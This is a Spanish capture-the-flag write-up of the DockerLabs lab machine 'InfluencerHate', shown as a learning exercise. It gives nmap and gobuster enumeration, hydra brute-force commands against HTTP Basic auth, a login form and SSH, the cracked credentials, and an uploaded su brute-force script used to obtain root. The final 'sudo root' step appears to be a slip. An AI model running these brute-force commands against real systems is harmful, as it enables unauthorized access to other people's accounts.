# Maquina InfluencerHate (DockerLabs)
<img width="504" height="330" alt="Screenshot_6" src="https://github.com/user-attachments/assets/c6126784-18cc-4ef3-a8ae-cf05683624f2" />

## Fase de Reconociemiento
Con lo que empiezo siempre es con un escaneo de puertos rapidos con NMAP:

```bash
# nmap -p- -n -v -Pn 172.17.0.2 -oN scan-basic 
---
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Puedo observar que tanto el puerto 22 (SSH) y el puerto 80 (http) están abiertos. Lo siguiente que me propongo es obtener mas información de esos puertos, los servicios y versiones:

```bash
# nmap -p22,80 -sVC 172.17.0.2 -oN scan-full
---
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

- Puerto 22: OpenSSH 9.2p1 Debian 2+deb12u6
- Puerto 80: Apache httpd 2.4.62

Con esta información me doy cuenta que las versiones de los servicios son relativamente recientes.  
  
Me dispongo, entonces, a buscar información dentro de la **Pàgina WEB de Apache** que contiene el servidor. Lo primero que se observa al acceder a la pàgina es un login, y aquí decido hacer el primer ataque de fuerza bruta.

<img width="543" height="381" alt="Screenshot_3" src="https://github.com/user-attachments/assets/86f4f3d3-734b-4785-af3a-a745a0821004" />

## Fase de Explotación
Lo mas conveniente que veo es hacer el ataque con `hydra`, directamente con una lista de credenciales por defecto:
```bash
# hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://172.17.0.2
---
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
```
- El usuario es: **httpadmin**
- La contraseña es: **fhttpadmin**

Al acceder, lo unico que hay disponible es la pagina por defecto de Apache sin mucha información vulnerable, así que decido hacer una enumeración de directorios con `gobuster` indicando las credenciales antes obtenidas:
```bash
# gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt,log -U httpadmin -P fhttpadmin
---
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
/server-status        (Status: 403) [Size: 275]
===============================================================
```

Se logra encontrar `/login.php` y decido acceder y examinarla:
  
<img width="596" height="856" alt="Screenshot_2" src="https://github.com/user-attachments/assets/f03c1dc6-9da3-43aa-8906-1a8aca2611c8" />

Como me encuentro en otro login, decido hacer otro ataque de fuerza bruta con `hydra` otra vez. Pero primero interceptamos la petición de login con `burpsuit`, el objetivo es identificar la cabezera de autorización y ver como se envía las credenciales para poder realizar el ataque de fuerza bruta:

<img width="489" height="347" alt="Screenshot_1" src="https://github.com/user-attachments/assets/51948847-9e5d-40c7-bad2-34eab62e4c7e" />

Y procedo con el ataque de fuerza bruta:
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P 300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas."
---
[80][http-post-form] host: 172.17.0.2   misc: /login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas.   login: admin   password: chocolate
```
(Decidí solo utilizar las primereras 300 contraseñas de rockyou para ir mas rápido)
- El usuario es: **admin**
- La contraseña es: **chocolate**

Cuando se logra acceder con las credenciales, lo que nos aparece es un mensaje donde nos menciona un usuario, **balutin**:
  
<img width="361" height="134" alt="Screenshot_4" src="https://github.com/user-attachments/assets/e8d0959a-b9ff-478b-bacc-b1f0611cdf59" />
  
De nuevo, decido hacer otro ataque de fuerza bruta con `hydra`, pero esta vez directamente al login del SSH que hemos detectado antes:
```bash
# hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
---
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
```
- La contraseña es: **estrella**

Procedo a entrar al servidor con el usuario **balutin** y la password **estrella**:  
```bash
> ssh balutin@172.17.0.2
```

### Escala de privilegios
Decido explorar por servidor con el usuario `balutin` con la idea de poder escalar privilegios, pero no encuentro nada claro. Decido investigar por internet métodos de escala de privilegios y me decanté por el script [suBruteforce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh). Un ataque de fuerza bruta directamente al usuario `root`.  

Primero hay que descargar el script y subirlo al servidor:
```bash
> scp suBruteforce.sh balutin@172.17.0.2:/tmp/
```
También, importante subir una lista de contraseñas:
```bash
> scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
```

Una vez hemos subido los archivos, accedemos con el usuario `balutin` y ejecutamos el script indicando el usuario y la lista de contraseñas:
```bash
> cd /tmp
> chmod +x suBruteforce.sh
> ./suBruteforce.sh root rockyou.txt
```
<img width="462" height="44" alt="Screenshot_5" src="https://github.com/user-attachments/assets/ee58be94-1e93-41e5-ad0a-d0fae405a5d2" />
  
- La contraseña es: **rockyou**

Procedo a acceder con el usuario `root`:
```bash
> sudo root
> whoami
---
root
```

## Comantarios
Esta es la tercera maquina realizo de **DockerLabs** y en esta he tardado mas en completarla que las anteriores ya que he tenido que investigar mucho sobre ataques de fuerza bruta, en este caso con `hydra`. Estoy empezando en el tema del pentesting y con esta maquina he aprendido mucho de fuerza bruta.
